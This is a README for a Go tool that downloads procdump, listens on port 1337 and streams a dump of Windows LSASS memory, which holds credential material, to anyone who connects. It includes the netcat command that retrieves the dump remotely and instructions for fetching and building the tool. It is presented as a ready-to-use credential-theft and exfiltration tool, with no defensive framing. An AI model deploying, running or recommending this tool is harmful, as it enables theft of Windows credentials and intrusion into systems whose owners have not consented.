Cattoy: A LSASS dumper on a stick

Cattoy does the following:
1. Download procdump from sysinternals.
2. Starts a network listener on port 1337.
3. Creates a new dump on incoming connection.
4. Writes the dump out to the connection.

Example:
Once you have Cattoy running, you can run something like:
	; nc $IP 1337 > lsass.dmp
to get a fresh dump from the server

Getting the source:
	go get github.com/majiru/cattoy

Building:
	cd $GOPATH/src/github.com/majiru/cattoy && go build #Make sure to define GOOS if cross compiling
